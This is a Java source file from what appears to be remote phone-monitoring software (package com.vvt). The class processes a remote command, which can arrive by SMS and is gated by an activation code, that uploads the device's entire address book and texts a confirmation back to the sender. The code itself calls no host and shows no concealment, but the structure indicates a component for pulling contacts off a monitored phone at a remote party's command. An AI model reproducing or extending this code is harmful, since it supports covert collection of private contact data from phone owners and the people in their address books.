package com.vvt.remotecommandmanager.processor.addressbook;

import java.util.concurrent.CountDownLatch;

import com.vvt.appcontext.AppContext;
import com.vvt.daemon_addressbook_manager.AddressbookDeliveryListener;
import com.vvt.daemon_addressbook_manager.AddressbookManager;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class ReqAddressBookProcessor extends RemoteCommandProcessor {
	private static final String TAG = "ReqAddressBookProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private AddressbookManager mAddressbookManager;
	private CountDownLatch waitForResponseLatch;
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public ReqAddressBookProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, AddressbookManager addressbookManager) {
		super(appContext,eventRepository);
		if(LOGV) FxLog.v(TAG, "ReqAddressBookProcessor # ENTER ...");
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mAddressbookManager = addressbookManager;
		
		if(mAddressbookManager == null)
			if(LOGE) FxLog.e(TAG, "addressbookManager is null");
		
		if(LOGV) FxLog.v(TAG, "ReqAddressBookProcessor # EXIT ...");
	}
	
	@Override
	public ProcessingType getProcessingType() {
		 return ProcessingType.ASYNC_HTTP;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		
		waitForResponseLatch = new CountDownLatch(1);
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}

		mAddressbookManager.sendAddressbook(mAddressbookDeliveryListener, 0);
		
		//Block the thread and wait till onSuccess or onError called.
		try { waitForResponseLatch.await(); } catch (InterruptedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() != 1) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
		 
	}
	
	AddressbookDeliveryListener mAddressbookDeliveryListener = new AddressbookDeliveryListener() {
		
		@Override
		public void onSuccess() {
			if(LOGV) FxLog.v(TAG, "onSuccess # ENTER...");
			mReplyMessageBuilder.append(MessageManager.REQUEST_ADDRESSBOOK_COMPLETE);
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			
			if(LOGD) FxLog.d(TAG, "onSuccess # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onSuccess # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onSuccess # EXIT...");
			waitForResponseLatch.countDown();
			
		} 
		
		@Override
		public void onError(int errorCode , String error) {
			if(LOGV) FxLog.v(TAG, "onError # ENTER...");
			mReplyMessageBuilder.append(MessageManager.getErrorMessage(errorCode));
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			
			if(LOGD) FxLog.d(TAG, "onError # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onError # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onError # EXIT..."); 
			waitForResponseLatch.countDown();
			
		}
	};

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
		 
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
		 
	}

}
